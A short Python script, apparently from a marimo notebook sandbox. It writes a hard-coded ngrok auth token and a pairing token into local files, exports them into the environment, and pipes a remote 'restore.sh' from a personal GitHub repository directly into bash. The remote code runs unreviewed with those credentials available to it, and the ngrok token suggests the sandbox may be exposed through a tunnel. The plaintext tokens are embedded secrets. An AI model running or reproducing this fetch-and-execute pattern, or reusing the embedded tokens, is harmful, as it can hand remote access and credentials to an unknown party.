import os, subprocess, textwrap
# Store secrets locally in the sandbox (mode 600)
envp="/marimo/.env"
env=open(envp).read() if os.path.exists(envp) else ""
if "NGROK_AUTHTOKEN" not in env:
    with open(envp,"a") as f:
        f.write('\nNGROK_AUTHTOKEN="3L09uCH8mECqv4vzla6oC8n5ClI_276LQj5xux1KxUyJuWv6c"\n')
os.chmod(envp,0o600)
token="54b407978599cd0c47dc4047ac63102c713589c9b4b3e7e699edc5d92c8665c5"
with open("/marimo/.pair_token","w") as f:
    f.write(token)
os.chmod("/marimo/.pair_token",0o600)
# Run the published restore script
cmd = "set -a; . /marimo/.env; set +a; curl -fsSL https://raw.githubusercontent.com/wanzabigail/Opencode/main/molab/restore.sh | bash"
p=subprocess.run(["bash","-lc",cmd], capture_output=True, text=True, timeout=120)
print("exit",p.returncode)
print(p.stdout[-1500:])
print("ERR",p.stderr[-1000:])
